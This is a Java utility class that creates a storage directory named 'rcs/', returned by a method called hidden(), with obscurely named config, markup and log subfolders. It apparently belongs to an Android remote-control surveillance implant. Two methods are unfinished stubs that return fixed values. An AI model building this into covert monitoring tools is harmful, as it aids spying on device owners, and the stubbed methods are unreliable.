package com.ht.RCSAndroidGUI.file;

import java.io.File;

import android.os.Environment;
import android.util.Log;

public class Path {

	private static final String TAG = "PATH";

	private static final String CONF_DIR = "cdd/";
    //public static final String DEBUG_DIR = "dwm/";
    private static final String MARKUP_DIR = "msdd/";
	private static final String LOG_DIR = "lgv/";
	
    //public static final String UPLOAD_DIR = "";

	public static String hidden() {
		return Environment.getExternalStorageDirectory()+"/"+"rcs/";
	}
	
	public static boolean makeDirs(){
		
		try {
			createDirectory(conf());
			createDirectory(markup());
			createDirectory(logs());

			return true;
		} catch (Exception e) {
			Log.e(TAG,e.toString());
		}
		return false;
	}
	
	public static String conf() {
		return hidden()+CONF_DIR;
	}
	
	public static String markup() {
		return hidden()+MARKUP_DIR;
	}

	public static String logs() {
		 return hidden()+LOG_DIR;
	}

	public static boolean removeDirectory(String string) {
		// TODO Auto-generated method stub
		return false;
	}

	public static boolean createDirectory(String dir) {
		File file = new File(dir);
		return file.mkdirs();
	}

	public static long freeSpace() {
		// TODO Auto-generated method stub
		return Long.MAX_VALUE;
	}



}
